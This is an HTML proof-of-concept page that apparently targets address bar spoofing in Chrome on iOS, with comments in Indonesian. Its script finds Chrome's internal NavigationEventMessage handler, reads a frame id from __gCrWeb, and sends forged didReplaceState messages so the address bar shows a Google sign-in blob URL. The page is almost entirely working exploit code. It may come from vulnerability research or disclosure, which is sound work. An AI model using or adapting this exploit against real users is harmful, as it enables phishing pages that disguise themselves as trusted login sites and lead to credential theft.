<!doctype html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <title>PoC Testbed - Address Bar Spoofing</title>
    <style>
        body { font-family: -apple-system, sans-serif; margin: 2em; background: #f4f4f9; color: #333; }
        .card { background: #fff; padding: 20px; border-radius: 8px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
        pre { background: #272822; color: #f8f8f2; padding: 12px; border-radius: 4px; overflow-x: auto; font-size: 12px; }
        .success { color: green; font-weight: bold; }
        .fail { color: red; font-weight: bold; }
    </style>
</head>
<body>
<div class="card">
    <h2>iOS Chrome History State PoC Testbed</h2>
    <p>Status: <span id="status">Initializing...</span></p>
    <pre id="log"></pre>
</div>

<script>
(function() {
    function logMessage(msg) {
        const pre = document.getElementById('log');
        pre.textContent += msg + '\n';
        console.log('[PoC] ' + msg);
    }

    logMessage("Location origin: " + (location.origin || '(opaque)'));
    logMessage("Location href: " + location.href);

    // 1. Deteksi keberadaan script message handler iOS Chrome
    var mh = (window.webkit && window.webkit.messageHandlers) || {};
    if (!mh.NavigationEventMessage) {
        document.getElementById('status').textContent = "Not vulnerable / Non-iOS Chrome environment";
        document.getElementById('status').className = "fail";
        logMessage("[-] window.webkit.messageHandlers.NavigationEventMessage is absent.");
        return;
    }

    document.getElementById('status').textContent = "Handler detected. Attempting state dispatch...";
    document.getElementById('status').className = "success";
    logMessage("[+] NavigationEventMessage handler found.");

    // 2. Ambil frame_id dari page-world __gCrWeb jika tersedia
    var fid = null;
    try {
        if (window.__gCrWeb && typeof window.__gCrWeb.getFrameId === 'function') {
            fid = window.__gCrWeb.getFrameId();
            logMessage("[+] __gCrWeb.getFrameId() = " + fid);
        }
    } catch (e) {
        logMessage("[-] Error reading frameId: " + e);
    }

    if (!fid) {
        logMessage("[-] Failed to retrieve frame_id. Aborting dispatch.");
        return;
    }

    // 3. Eksekusi pengiriman pesan didReplaceState dengan target cross-origin blob
    var spoofTarget = 'blob:https://accounts.google.com/signin';
    
    try {
        mh.NavigationEventMessage.postMessage({
            command: 'willChangeState', 
            frame_id: fid
        });
        
        mh.NavigationEventMessage.postMessage({
            command: 'didReplaceState', 
            frame_id: fid,
            stateObject: '', 
            baseUrl: 'https://x/',
            pageUrl: spoofTarget
        });
        
        logMessage("[+] Dispatched crafted didReplaceState payload targeting: " + spoofTarget);
    } catch (err) {
        logMessage("[-] postMessage failed: " + err);
    }
})();
</script>
</body>
</html>
